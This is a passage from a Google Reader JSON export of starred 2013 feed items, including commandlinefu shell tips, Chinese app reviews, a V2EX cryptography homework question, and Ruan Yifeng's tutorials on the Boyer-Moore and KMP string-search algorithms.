    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/initiative",
      "title" : "est&#39;s blog",
      "htmlUrl" : "http://blog.est.im/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1368093122949",
    "timestampUsec" : "1368093122949915",
    "id" : "tag:google.com,2005:reader/item/aa64577067a3ad8b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Go to a specified line in a file",
    "published" : 1368087868,
    "updated" : 1368087868,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12304/go-to-a-specified-line-in-a-file"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/bEgYwHJHgK8/go-to-a-specified-line-in-a-file",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ vim +143 filename.txt</code>\n<div></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12304/go-to-a-specified-line-in-a-file\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/techie\">View all commands by <strong>techie</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/bEgYwHJHgK8\" height=\"1\" width=\"1\">"
    },
    "author" : "techie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1368093072741",
    "timestampUsec" : "1368093072741414",
    "id" : "tag:google.com,2005:reader/item/dc1274becbe2da97",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Remove duplicate lines using awk",
    "published" : 1368087810,
    "updated" : 1368087810,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12303/remove-duplicate-lines-using-awk"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/nQTxKl8GG8U/remove-duplicate-lines-using-awk",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ awk '!($0 in array) { array[$0]; print }' temp</code>\n<div></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12303/remove-duplicate-lines-using-awk\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/techie\">View all commands by <strong>techie</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/nQTxKl8GG8U\" height=\"1\" width=\"1\">"
    },
    "author" : "techie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1368066800669",
    "timestampUsec" : "1368066800669283",
    "id" : "tag:google.com,2005:reader/item/f1ca46da3be7ea4b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "「做到极致」苹果摄影师谈苹果产品宣传照拍摄细节",
    "published" : 1368117780,
    "updated" : 1368117780,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/14377",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p>众所周知苹果公司的产品宣传图片都相当的简洁优雅，所以可想而知他们在这块的工作一定也做的相当的细致和用心。国外媒体 The Verge 近日采访了跟苹果合作多年的摄影师  Peter Belanger，一起为大家揭开苹果拍摄产品宣传照的细节内容。</p>\n\n<p><img src=\"http://www.iapps.im/public/uploadfiles/2013/05/article/d3f28f618119253bf16095817652f794.jpg\" alt=\"\" title=\"\">\n</p></div>"
    },
    "author" : "iSkuggy",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367893705758",
    "timestampUsec" : "1367893705758989",
    "id" : "tag:google.com,2005:reader/item/8f207ffc8cdbf481",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "「访谈视频」乔布斯：遗失的访谈",
    "published" : 1367782836,
    "updated" : 1367782836,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/14276",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p>可能很多人看过了这部 《乔布斯：遗失的访谈》，这次我们为大家带来由<strong><a href=\"http://e.weibo.com/7seals\">七印部落</a></strong>译制的中文字幕版，喜欢的可以重温一下：</p>\n\n<p><img src=\"http://www.iapps.im/public/uploadfiles/2013/05/article/35ece9b6b255a54d32f46c42899c56ae.jpg\" alt=\"\" title=\"\">\n</p></div>"
    },
    "author" : "iskuggy",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367750846151",
    "timestampUsec" : "1367750846151494",
    "id" : "tag:google.com,2005:reader/item/e55c52d8d701d044",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "密码学基础问题两道",
    "published" : 1367736810,
    "updated" : 1367750195,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/67774#reply1",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "1. The numbers 7 and 23 are relatively prime and therefore there must exist integers a and b such that 7a+23b=1. Find such a pair of integers (a,b) with the smallest possible a&gt;0. Given this pair, can you determine the inverse of 7 in Z23?<br>Enter below comma separated values for a, b, and for inverse of 7 in Z23.<br>这题答案为什么不是10,-10,10?<br><br>2. What is the discete log of 5 base 2 in Z13? (i.e. what is Dlog2(5))<br>Recall that the powers of 2 in Z13 are &lt;2&gt;={1,2,4,8,3,6,12,11,9,5,10,7}<br>这题答案应该怎么算啊？老弄不懂Dlog到底应该怎么计算，求过程"
    },
    "author" : "tesorouo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367606123722",
    "timestampUsec" : "1367606123722769",
    "id" : "tag:google.com,2005:reader/item/4a7a9df20c458367",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "发现一个好玩的程序 SHELL GOOGLE可以任意搜索~ 刚部署了下发出来教程~",
    "published" : 1367603922,
    "updated" : 1367731323,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/67646#reply2",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "发现一个很好玩的shell的google搜索 我把配置方法整理了下~ 欢迎来玩~<br><br>源码提供：goosh.org<br><br>源地址： <a href=\"https://github.com/tolecnal/goosh-installer\">https://github.com/tolecnal/goosh-installer</a><br><br>源码以及中文教程地址：  <a href=\"https://github.com/liuhang0077/goosh-installer\">https://github.com/liuhang0077/goosh-installer</a><br><br>我部署的站点:  <a href=\"http://google.icode.hk/\">http://google.icode.hk/</a>"
    },
    "author" : "liuhang0077",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367567261262",
    "timestampUsec" : "1367567261262954",
    "id" : "tag:google.com,2005:reader/item/77c929e9b4a75ebf",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Algorithm" ],
    "title" : "字符串匹配的Boyer-Moore算法",
    "published" : 1367560045,
    "updated" : 1367560045,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>上一篇文章，我介绍了<a href=\"http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html\">KMP算法</a>。</p><p>但是，它并不是效率最高的算法，实际采用并不多。各种文本编辑器的\"查找\"功能（Ctrl+F），大多采用<a href=\"http://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string_search_algorithm\">Boyer-Moore算法</a>。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050301.jpg\"></p>\n\n<p>Boyer-Moore算法不仅效率高，而且构思巧妙，容易理解。1977年，德克萨斯大学的Robert S. Boyer教授和J Strother Moore教授发明了这种算法。</p>\n\n<p>下面，我根据Moore教授自己的<a href=\"http://www.cs.utexas.edu/~moore/best-ideas/string-searching/fstrpos-example.html\">例子</a>来解释这种算法。</p>\n\n<p>1.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050302.png\"></p>\n\n<p>假定字符串为\"HERE IS A SIMPLE EXAMPLE\"，搜索词为\"EXAMPLE\"。</p>\n\n<p>2.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050303.png\"></p>\n\n<p>首先，\"字符串\"与\"搜索词\"头部对齐，从尾部开始比较。</p>\n\n<p>这是一个很聪明的想法，因为如果尾部字符不匹配，那么只要一次比较，就可以知道前7个字符（整体上）肯定不是要找的结果。</p>\n\n<p>我们看到，\"S\"与\"E\"不匹配。这时，<strong>\"S\"就被称为\"坏字符\"（bad character），即不匹配的字符。</strong>我们还发现，\"S\"不包含在搜索词\"EXAMPLE\"之中，这意味着可以把搜索词直接移到\"S\"的后一位。</p>\n\n<p>3.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050304.png\"></p>\n\n<p>依然从尾部开始比较，发现\"P\"与\"E\"不匹配，所以\"P\"是\"坏字符\"。但是，\"P\"包含在搜索词\"EXAMPLE\"之中。所以，将搜索词后移两位，两个\"P\"对齐。</p>\n\n<p>4.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050305.png\"></p>\n\n<p>我们由此总结出<strong>\"坏字符规则\"</strong>：</p>\n\n<blockquote>\n\n<p>　　后移位数 = 坏字符的位置 - 搜索词中的上一次出现位置</p>\n\n</blockquote>\n\n<p>如果\"坏字符\"不包含在搜索词之中，则上一次出现位置为 -1。</p>\n\n<p>以\"P\"为例，它作为\"坏字符\"，出现在搜索词的第6位（从0开始编号），在搜索词中的上一次出现位置为4，所以后移 6 - 4 = 2位。再以前面第二步的\"S\"为例，它出现在第6位，上一次出现位置是 -1（即未出现），则整个搜索词后移 6 - (-1) = 7位。</p>\n\n<p>5.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050306.png\"></p>\n\n<p>依然从尾部开始比较，\"E\"与\"E\"匹配。</p>\n\n<p>6.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050307.png\"></p>\n\n<p>比较前面一位，\"LE\"与\"LE\"匹配。</p>\n\n<p>7.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050308.png\"></p>\n\n<p>比较前面一位，\"PLE\"与\"PLE\"匹配。</p>\n\n<p>8.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050309.png\"></p>\n\n<p>比较前面一位，\"MPLE\"与\"MPLE\"匹配。<strong>我们把这种情况称为\"好后缀\"（good suffix），即所有尾部匹配的字符串。</strong>注意，\"MPLE\"、\"PLE\"、\"LE\"、\"E\"都是好后缀。</p>\n\n<p>9.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050310.png\"></p>\n\n<p>比较前一位，发现\"I\"与\"A\"不匹配。所以，\"I\"是\"坏字符\"。</p>\n\n<p>10.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050311.png\"></p>\n\n<p>根据\"坏字符规则\"，此时搜索词应该后移 2 - （-1）= 3 位。问题是，此时有没有更好的移法？</p>\n\n<p>11.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050309.png\"></p>\n\n<p>我们知道，此时存在\"好后缀\"。所以，可以采用<strong>\"好后缀规则\"</strong>：</p>\n\n<blockquote>\n\n<p>　　后移位数 = 好后缀的位置 - 搜索词中的上一次出现位置</p>\n\n</blockquote>\n\n<p>举例来说，如果字符串\"ABCDAB\"的后一个\"AB\"是\"好后缀\"。那么它的位置是5（从0开始计算，取最后的\"B\"的值），在\"搜索词中的上一次出现位置\"是1（第一个\"B\"的位置），所以后移 5 - 1 = 4位，前一个\"AB\"移到后一个\"AB\"的位置。</p>\n\n<p>再举一个例子，如果字符串\"ABCDEF\"的\"EF\"是好后缀，则\"EF\"的位置是5 ，上一次出现的位置是 -1（即未出现），所以后移 5 - (-1) = 6位，即整个字符串移到\"F\"的后一位。</p>\n\n<p>这个规则有三个注意点：</p>\n\n<blockquote>\n\n<p>　　（1）\"好后缀\"的位置以最后一个字符为准。假定\"ABCDEF\"的\"EF\"是好后缀，则它的位置以\"F\"为准，即5（从0开始计算）。</p>\n\n<p>　　（2）如果\"好后缀\"在搜索词中只出现一次，则它的上一次出现位置为 -1。比如，\"EF\"在\"ABCDEF\"之中只出现一次，则它的上一次出现位置为-1（即未出现）。</p>\n\n<p>　　（3）如果\"好后缀\"有多个，则除了最长的那个\"好后缀\"，其他\"好后缀\"的上一次出现位置必须在头部。比如，假定\"BABCDAB\"的\"好后缀\"是\"DAB\"、\"AB\"、\"B\"，请问这时\"好后缀\"的上一次出现位置是什么？回答是，此时采用的好后缀是\"B\"，它的上一次出现位置是头部，即第0位。这个规则也可以这样表达：如果最长的那个\"好后缀\"只出现一次，则可以把搜索词改写成如下形式进行位置计算\"(DA)BABCDAB\"，即虚拟加入最前面的\"DA\"。</p>\n\n</blockquote>\n\n<p>回到上文的这个例子。此时，所有的\"好后缀\"（MPLE、PLE、LE、E）之中，只有\"E\"在\"EXAMPLE\"还出现在头部，所以后移 6 - 0 = 6位。 </p>\n\n<p>12.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050312.png\"></p>\n\n<p>可以看到，\"坏字符规则\"只能移3位，\"好后缀规则\"可以移6位。所以，<strong>Boyer-Moore算法的基本思想是，每次后移这两个规则之中的较大值。</strong></p>\n\n<p>更巧妙的是，这两个规则的移动位数，只与搜索词有关，与原字符串无关。因此，可以预先计算生成《坏字符规则表》和《好后缀规则表》。使用时，只要查表比较一下就可以了。</p>\n\n<p>13.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050313.png\"></p>\n\n<p>继续从尾部开始比较，\"P\"与\"E\"不匹配，因此\"P\"是\"坏字符\"。根据\"坏字符规则\"，后移 6 - 4 = 2位。</p>\n\n<p>14.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050314.png\"></p>\n\n<p>从尾部开始逐位比较，发现全部匹配，于是搜索结束。如果还要继续查找（即找出全部匹配），则根据\"好后缀规则\"，后移 6 - 0 = 6位，即头部的\"E\"移到尾部的\"E\"的位置。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html\">http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html</a></li>\n<li>最后修改时间：2013年5月17日 10:02</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://ushan.cn?utm_source=ruanyifeng.com\" style=\"border:none\">优衫（Ushan）是国内顶尖的定制西服店，常年为众多政商名流、影视明星、跨国高管定制衬衫与西服。以工艺精良、用料考究、版型出色、性价比高等特点广受各界好评。</a>\n</p>\n\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367553054525",
    "timestampUsec" : "1367553054525196",
    "id" : "tag:google.com,2005:reader/item/3f89c105cbbb7c56",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "「本周最佳」音乐助手：Jamn – The musician’s multi-tool",
    "published" : 1367602285,
    "updated" : 1367602285,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/14235",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><img src=\"http://www.iapps.im/\" style=\"width:114px;height:114px;float:left;margin:5px 10px 10px 0;border-radius:20px\"><p>应用的质量非常之高，小编试用之后才发现原来是苹果的本周最佳，上架以来的首次限免哦，时间一周，大家抓紧！</p>\n\n<p>今天的这款应用并不仅仅局限于某一样乐器，通过Jamn，用户可以学习到吉他、钢琴、贝斯这三种乐器的和弦知识以及指法教程。既然是编推的应用那么内容的质量自是无需多说，应用令小编印象深刻的则是其非常人性化的界面设计与画面效果，用户可以通过滑动来切换不同的乐器，或是转动和点击来选择不同的和弦类型… 简洁的界面设计不仅使用起来非常顺手，也非常有利于用户记忆与认知。But！应用最厉害的功能还是帮助用户创作，点击不同的用户可以快速切换各个和弦的各种类型，快速的将自己的灵感变为真实的音乐，附上开发商的介绍视频来体验一下吧！</p>\n\n<p>视频见正文… </p></div><p>价格：免费</p><p>下载地址：<a href=\"http://www.iapps.im/itunes/530470606cn\">http://www.iapps.im/itunes/530470606cn</a></p><p>应用截图:</p><img src=\"http://a147.phobos.apple.com/us/r1000/072/Purple/v4/fb/30/7f/fb307f24-e215-facc-22f6-d3692944bead/mzl.dyxhgosj.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a9.phobos.apple.com/us/r1000/091/Purple2/v4/88/de/d6/88ded6ff-3eaa-87ba-c557-ec7dacd432c7/mzl.vboabvmy.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a374.phobos.apple.com/us/r1000/115/Purple2/v4/24/ca/96/24ca9603-0283-17da-a96d-f91bacc8af4a/mzl.fkxkxnzl.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a1811.phobos.apple.com/us/r1000/065/Purple/v4/f2/00/cb/f200cbe8-8adb-8add-0f66-5a346a30242b/mzl.jmuajqwj.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a1948.phobos.apple.com/us/r1000/068/Purple2/v4/22/7b/45/227b45f7-0426-ca98-3a80-2b7aa4f7449f/mzl.joiamusl.320x480-75.jpg\" alt=\"截图\">"
    },
    "author" : "silentyt",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367472189421",
    "timestampUsec" : "1367472189421911",
    "id" : "tag:google.com,2005:reader/item/19b9feabfe3bf9e1",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "「乐器学习」吉他入门：Star Scales HD For Guitar",
    "published" : 1370620860,
    "updated" : 1370620860,
    "alternate" : [ {
      "href" : "http://www.iapps.im/single/14200",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><img src=\"http://www.iapps.im/\" style=\"width:114px;height:114px;float:left;margin:5px 10px 10px 0;border-radius:20px\"><p>想要学习吉他的朋友们有没有像小编一样，看到那复杂的指法键位就望而却步了？身边缺少个贴心的老师总是没有安全感，觉得自己学不会。收下这款吉他音调键位学习软件吧，可能会对你的吉他学习有些帮助呢！</p>\n\n<p>软件中包含了所有蓝调、摇滚和爵士乐的音调键位指法，你能很清楚的看到哆、来、咪、发、唆、啦...音调位置，点击左下播放键软件还会自动从低到高再从高到低弹上一边，使用这款软件有助于想要学习吉他的朋友掌握各个音调的位置，其中还有着练习模式，帮助大家通过不断训练产生肌肉记忆，能更好的学习吉他。</p>\n</div><p>价格：免费</p><p>下载地址：<a href=\"http://www.iapps.im/itunes/303486854cn\">http://www.iapps.im/itunes/303486854cn</a></p><p>下载地址：<a href=\"https://itunes.apple.com/cn/app/star-scales-hd-for-guitar/id578144539?mt=8&amp;uo=4\">https://itunes.apple.com/cn/app/star-scales-hd-for-guitar/id578144539?mt=8&amp;uo=4</a></p><p>应用截图:</p><img src=\"http://a2.mzstatic.com/us/r1000/084/Purple/v4/e3/49/3f/e3493fae-996b-c758-ac90-9225db51c657/mzl.rpeyrmlc.1136x1136-75.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a3.mzstatic.com/us/r1000/065/Purple/v4/d6/95/1d/d6951dfc-f1a8-e7d0-e503-4228d120018c/mzl.hyirlhfz.1136x1136-75.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a4.mzstatic.com/us/r1000/093/Purple/v4/ed/3d/84/ed3d8430-a525-b470-da5d-0f2fac028f36/mzl.xqvbgumf.1136x1136-75.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a2.mzstatic.com/us/r1000/107/Purple/v4/ea/ec/16/eaec16ca-2159-6b8e-62b3-6576032191b3/mzl.ldnjlnof.1136x1136-75.320x480-75.jpg\" alt=\"截图\"><img src=\"http://a4.mzstatic.com/us/r1000/096/Purple/v4/f1/fa/f7/f1faf74b-c3d7-3d6d-311c-043ab34771e6/mzl.ybldrupt.1136x1136-75.320x480-75.jpg\" alt=\"截图\">"
    },
    "author" : "Akira.Y.胖虎",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367405987204",
    "timestampUsec" : "1367405987204441",
    "id" : "tag:google.com,2005:reader/item/c965f481d17aae61",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Algorithm" ],
    "title" : "字符串匹配的KMP算法",
    "published" : 1367405208,
    "updated" : 1367405208,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://en.wikipedia.org/wiki/String_searching_algorithm\">字符串匹配</a>是计算机的基本任务之一。</p><p>举例来说，有一个字符串\"BBC ABCDAB ABCDABCDABDE\"，我想知道，里面是否包含另一个字符串\"ABCDABD\"？</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050101.jpg\"></p>\n\n<p>许多算法可以完成这个任务，<a href=\"http://en.wikipedia.org/wiki/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm\">Knuth-Morris-Pratt算法</a>（简称KMP）是最常用的之一。它以三个发明者命名，起头的那个K就是著名科学家Donald Knuth。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050102.jpg\"></p>\n\n<p>这种算法不太容易理解，网上有很多<a href=\"http://www.google.com/search?q=Knuth-Morris-Pratt+algorithm\">解释</a>，但读起来都很费劲。直到读到<a href=\"http://jakeboxer.com/blog/2009/12/13/the-knuth-morris-pratt-algorithm-in-my-own-words/\">Jake Boxer</a>的文章，我才真正理解这种算法。下面，我用自己的语言，试图写一篇比较好懂的KMP算法解释。</p>\n\n<p>1.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050103.png\"></p>\n\n<p>首先，字符串\"BBC ABCDAB ABCDABCDABDE\"的第一个字符与搜索词\"ABCDABD\"的第一个字符，进行比较。因为B与A不匹配，所以搜索词后移一位。</p>\n\n<p>2.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050104.png\"></p>\n\n<p>因为B与A不匹配，搜索词再往后移。</p>\n\n<p>3.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050105.png\"></p>\n\n<p>就这样，直到字符串有一个字符，与搜索词的第一个字符相同为止。</p>\n\n<p>4.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050106.png\"></p>\n\n<p>接着比较字符串和搜索词的下一个字符，还是相同。</p>\n\n<p>5.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050107.png\"></p>\n\n<p>直到字符串有一个字符，与搜索词对应的字符不相同为止。</p>\n\n<p>6.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050108.png\"></p>\n\n<p>这时，最自然的反应是，将搜索词整个后移一位，再从头逐个比较。这样做虽然可行，但是效率很差，因为你要把\"搜索位置\"移到已经比较过的位置，重比一遍。</p>\n\n<p>7.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050107.png\"></p>\n\n<p>一个基本事实是，当空格与D不匹配时，你其实知道前面六个字符是\"ABCDAB\"。KMP算法的想法是，设法利用这个已知信息，不要把\"搜索位置\"移回已经比较过的位置，继续把它向后移，这样就提高了效率。</p>\n\n<p>8.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050109.png\"></p>\n\n<p>怎么做到这一点呢？可以针对搜索词，算出一张《部分匹配表》（Partial Match Table）。这张表是如何产生的，后面再介绍，这里只要会用就可以了。</p>\n\n<p>9.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050107.png\"></p>\n\n<p>已知空格与D不匹配时，前面六个字符\"ABCDAB\"是匹配的。查表可知，最后一个匹配字符B对应的\"部分匹配值\"为2，因此按照下面的公式算出向后移动的位数：</p>\n\n<blockquote>\n\n<p>　　移动位数 = 已匹配的字符数 - 对应的部分匹配值</p>\n\n</blockquote>\n\n<p>因为 6 - 2 等于4，所以将搜索词向后移动4位。</p>\n\n<p>10. </p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050110.png\"></p>\n\n<p>因为空格与Ｃ不匹配，搜索词还要继续往后移。这时，已匹配的字符数为2（\"AB\"），对应的\"部分匹配值\"为0。所以，移动位数 = 2 - 0，结果为 2，于是将搜索词向后移2位。</p>\n\n<p>11.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050111.png\"></p>\n\n<p>因为空格与A不匹配，继续后移一位。</p>\n\n<p>12.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050112.png\"></p>\n\n<p>逐位比较，直到发现C与D不匹配。于是，移动位数 = 6 - 2，继续将搜索词向后移动4位。</p>\n\n<p>13.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050113.png\"></p>\n\n<p>逐位比较，直到搜索词的最后一位，发现完全匹配，于是搜索完成。如果还要继续搜索（即找出全部匹配），移动位数 = 7 - 0，再将搜索词向后移动7位，这里就不再重复了。</p>\n\n<p>14.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050114.png\"></p>\n\n<p>下面介绍《部分匹配表》是如何产生的。</p>\n\n<p>首先，要了解两个概念：\"前缀\"和\"后缀\"。 \"前缀\"指除了最后一个字符以外，一个字符串的全部头部组合；\"后缀\"指除了第一个字符以外，一个字符串的全部尾部组合。</p>\n\n<p>15.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050109.png\"></p>\n\n<p>\"部分匹配值\"就是\"前缀\"和\"后缀\"的最长的共有元素的长度。以\"ABCDABD\"为例，</p>\n\n<blockquote>\n\n<p>　　－　\"A\"的前缀和后缀都为空集，共有元素的长度为0；</p>\n\n<p>　　－　